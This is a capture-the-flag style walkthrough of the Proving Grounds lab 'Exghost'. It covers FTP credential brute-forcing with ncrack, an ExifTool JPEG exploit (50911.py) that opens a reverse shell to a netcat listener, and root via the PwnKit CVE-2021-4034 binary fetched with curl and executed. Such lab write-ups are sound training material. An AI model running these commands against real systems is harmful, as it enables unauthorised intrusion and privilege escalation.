---
title: Exghost
date: 2026-01-01T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - ncrack
  - wireshark
  - exiftool
  - venv
categories:
  - Pentesting
  - Linux
  - Offsec
description: "This guide provides readers with the solution to the Proving Grounds Lab: Exghost"
---
nmap reveals ftp 

try to login with no creds, it asks for a username and password. 

ncrack the fkn shit out if it. 

`ncrack -U /usr/share/wordlists/metasploit/http_default_users.txt  -P /usr/share/wordlists/metasploit/http_default_pass.txt ftp://192.168.212.183`

login to ftp and 'get' - the file named backup

`file backup` - will show that is a pcap file

![](Screenshot%202025-12-11%20at%2016.06.54.png)

`wireshark backup &` 

![](Screenshot%202025-12-11%20at%2015.33.37.png)

![](Screenshot%202025-12-11%20at%2015.34.17.png)

Exiftool server version 12.23 taking in JPEGs

![](Screenshot%202025-12-11%20at%2015.35.25.png)

![](Screenshot%202025-12-11%20at%2015.34.55.png)

`searchsploit exittool`

Using the 50911.py exploit create a jpg file with a the ip of your attack box.
	
Start a listener in another tab/window

`nc -lnvp 1234`

You'll need to use python venv 

`source aura/bin/activate' 

Install a library

`sudo apt-get -y install djvulibre-bin`

`python3 /usr/share/exploitdb/exploits/linux/local/50911.py -s attack_machine_ip 1234`

![](Screenshot%202025-12-11%20at%2015.30.45.png)

`curl -v -F myFile=@image.jpg http://192.168.212.183/exiftest.php`

This myFile is important. Its in the pcap file. not sure why yet. the image.jpg 

![](Screenshot%202025-12-11%20at%2015.29.22.png)When you execute this command it should get to the upload completely sent off line then stop.

![](Screenshot%202025-12-11%20at%2015.32.21.png)

Once you have a shell with www.data you need to find a way to escalate privileges. 

LinPeas might work, I read the lab description which mentions a process called Polkit. 

'searchsploit Polkit' gets you this CVE: https://nvd.nist.gov/vuln/detail/cve-2021-4034

Google: `privilege escalation cve-2021-4034 github`

https://github.com/ly4k/PwnKit/blob/main/PwnKit.sh

![](Screenshot%202025-12-11%20at%2016.19.12.png)

I ran these individually and was gifted root

`curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit`

`chmod +x ./PwnKit`

`./PwnKit`

